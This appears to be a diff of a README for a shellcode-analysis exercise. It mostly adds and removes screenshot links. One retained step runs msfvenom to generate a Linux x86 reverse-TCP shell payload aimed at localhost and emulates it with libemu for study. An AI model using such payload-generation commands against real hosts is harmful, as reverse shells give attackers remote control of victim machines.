@@ -1,6 +1,15 @@
 # Exercise 2
 
 
+## Usage
+
+![Screenshot](images/wrapper/1.png)
+
+![Screenshot](images/wrapper/2.png)
+
+
+## Steps
+
 ```
 sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" bindshell | tee libemu_res/libemu_res.txt
 ```
@@ -29,26 +38,5 @@ c[::-1].encode('hex')
 
 ![Screenshot](images/resd_problem/5.png)
 
-![Screenshot](images/Screenshot_1.png)
-
-![Screenshot](images/Screenshot_2.png)
-
-![Screenshot](images/Screenshot_3.png)
-
-![Screenshot](images/Screenshot_4.png)
-
-![Screenshot](images/Screenshot_5.png)
-
-![Screenshot](images/Screenshot_6.png)
-
-![Screenshot](images/Screenshot_7.png)
-
-![Screenshot](images/Screenshot_8.png)
-
-![Screenshot](images/Screenshot_9.png)
-
-![Screenshot](images/Screenshot_10.png)
-
-![Screenshot](images/Screenshot_11.png)
 
 
